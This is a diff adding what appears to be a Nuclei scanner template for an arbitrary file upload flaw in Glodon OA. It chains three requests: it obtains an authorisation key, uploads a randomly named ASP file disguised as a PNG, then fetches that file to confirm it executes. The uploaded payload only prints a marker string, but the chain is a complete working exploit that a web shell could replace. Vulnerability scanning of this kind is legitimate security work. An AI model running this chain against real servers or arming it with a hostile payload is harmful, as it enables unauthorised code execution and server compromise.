@@ -1,0 +1,79 @@
+id: glodon-file-upload-poc
+info:
+  name: Glodon OA Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits an arbitrary file upload vulnerability in Glodon OA to execute crafted payloads.
+  tags: file-upload,critical,exploit
+
+variables:
+  filename: "{{to_lower(rand_text_alphanumeric(6))}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: get-authorize-key
+    method: POST
+    path:
+      - "/Services/FileService/UserFiles/GetAuthorizeKey.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      cmd=&destDir=./sysinfo/&destFilename={{filename}}.asp
+    extractors:
+      - type: regex
+        name: key
+        internal: true
+        regex:
+          - 'key:"(?P<key>.*?)"'
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: upload-file
+    method: POST
+    path:
+      - "/Services/FileService/UserFiles/UserFilesUpload.ashx"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+    body: |
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+      Content-Disposition: form-data; name="key"
+      
+      {{key}}
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+      Content-Disposition: form-data; name="destDir"
+      
+      ./sysinfo/
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+      Content-Disposition: form-data; name="destFilename"
+      
+      {{filename}}.asp
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.asp"
+      content-type: image/png
+      
+      <% response.write("This website has a vulnerability")%>
+      ------WebKitFormBoundarytCOFhbEjc3IfYaY5--
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "已存储为"
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "/UserFiles/sysinfo/{{filename}}.asp"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "This website has a vulnerability"
